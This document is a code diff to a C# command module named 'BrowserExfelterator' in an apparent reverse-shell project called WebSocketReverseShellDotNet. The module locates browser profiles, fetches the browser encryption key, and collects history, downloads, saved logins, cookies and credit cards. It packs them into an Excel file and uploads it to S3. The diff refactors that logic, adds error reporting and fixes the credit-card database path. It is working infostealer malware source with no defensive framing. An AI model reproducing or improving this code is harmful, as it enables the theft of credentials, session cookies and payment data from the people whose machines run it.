@@ -17,13 +17,14 @@ using Org.BouncyCastle.Crypto.Modes;
 using Org.BouncyCastle.Crypto.Parameters;
 using Org.BouncyCastle.Security;
 using Org.BouncyCastle.Crypto.Engines;
+using WebSocketReverseShellDotNet.test.utils;
 
 
 namespace WebSocketReverseShellDotNet.service.commands
 {
     internal class BrowserExfelterator : Command
     {
-
+        StringBuilder stringBuilder = new StringBuilder();
 
         Dictionary<string, List<object>> browserData = new Dictionary<string, List<object>>();
 
@@ -48,49 +49,61 @@ namespace WebSocketReverseShellDotNet.service.commands
         public string ExecuteCommand(string command)
         {
 
-            /*StringBuilder stringBuilder = new StringBuilder();*/
+            
             try 
             {
                 foreach (String browserHome in Constants.LIST_OF_BROWSER_LOCATIONS)
                 {
                     if (!OSUtil.DirectoryExists(browserHome)) continue;
-                    byte[] encryptionKey = getEncryptionKey(browserHome);
-
+                    byte[] encryptionKey = getEncryptionKey(browserHome,stringBuilder);
                     processProfile(browserHome, encryptionKey);
-                }
-                if (history.Count != 0)
-                {
-                    browserData.Add(historyKey, history);
-                }
-                if (downloadHistory.Count != 0)
-                {
-                    browserData.Add(downloadHistoryKey, downloadHistory);
-                }
 
-                if (login.Count != 0)
-                {
-                    browserData.Add(loginKey, login);
-                }
-                if (cookies.Count != 0)
-                {
-                    browserData.Add(cookiesKey, cookies);
-                }
 
-                if (creditCards.Count != 0)
-                {
-                    browserData.Add(creditCardsKey, creditCards);
+
                 }
+                addAllDataToHashMap();
                 string path = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}\\browser.xlsx";
                 FileInfo file = Excel.ConvertToExcel(browserData, path);
-                return S3Uploadutil.UploadToS3(file);
+                stringBuilder.AppendLine(S3Uploadutil.UploadToS3(file));
+
+                return stringBuilder.ToString();
             } catch (Exception ex)
             {
-                return ex.Message;
+                stringBuilder.AppendLine(ex.Message);
+                return stringBuilder.ToString();
+                
             }
+
             
         }
 
-        private byte[]  getEncryptionKey(String browserHome)
+        private void addAllDataToHashMap()
+        {
+            if (history.Count != 0)
+            {
+                browserData.Add(historyKey, history);
+            }
+            if (downloadHistory.Count != 0)
+            {
+                browserData.Add(downloadHistoryKey, downloadHistory);
+            }
+
+            if (login.Count != 0)
+            {
+                browserData.Add(loginKey, login);
+            }
+            if (cookies.Count != 0)
+            {
+                browserData.Add(cookiesKey, cookies);
+            }
+
+            if (creditCards.Count != 0)
+            {
+                browserData.Add(creditCardsKey, creditCards);
+            }
+        }
+
+        private byte[] getEncryptionKey(String browserHome, StringBuilder stringBuilder)
         {
 
             try {
@@ -149,6 +162,7 @@ namespace WebSocketReverseShellDotNet.service.commands
             }
             catch (Exception e)
             {
+                DataManuplationUtil.addNewLine(stringBuilder,e.Message);
                 /*Console.WriteLine(e.Message);*/
                 return [];
 
@@ -184,9 +198,11 @@ namespace WebSocketReverseShellDotNet.service.commands
 
                 if (!OSUtil.DirectoryExists(profilePath)) continue;
                 exfilterateUserData(profilePath, encryptionKey);
-
             }
+            
         }
+
+  
 
         private void exfilterateUserData(String profilePath, byte[] encryptionKey)
         {
@@ -208,6 +224,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e) {
                     /*Console.WriteLine(e.Message);*/
+                    stringBuilder.AppendLine (e.Message);
                 }
                
             }
@@ -225,6 +242,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 catch (Exception e)
                 {
                     /*Console.WriteLine(e.Message);*/
+                    stringBuilder.AppendLine(e.Message);
                 }
             }
 
@@ -239,11 +257,12 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                  /*  Console.WriteLine(e.Message);*/
+                    stringBuilder.AppendLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
             }
 
-            String creditCards = profileDir + Constants.COOKIES_BROWSER_DB;
+            String creditCards = profileDir + Constants.CREDIT_CARDS_BROWSER_DB;
             creditCards = OSUtil.CopyFileWithNumberPreAppended(creditCards, folderPath, 1);
             if (!String.IsNullOrEmpty(creditCards))
             {
@@ -254,9 +273,11 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                   /* Console.WriteLine(e.Message);*/
+                    stringBuilder.AppendLine(e.Message);
+                    /* Console.WriteLine(e.Message);*/
                 }
             }
+            
 
         }
 
@@ -409,7 +430,8 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e) 
                 {
-                   /* Console.WriteLine(e.Message);*/
+                    /* Console.WriteLine(e.Message);*/
+                    DataManuplationUtil.addNewLine(stringBuilder, e.Message);
                 
                  }
                 try {
@@ -445,6 +467,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 } 
                 catch (Exception e)
                 {
+                    DataManuplationUtil.addNewLine(stringBuilder, e.Message);
                     /*Console.WriteLine(e.Message);*/
                 }
 
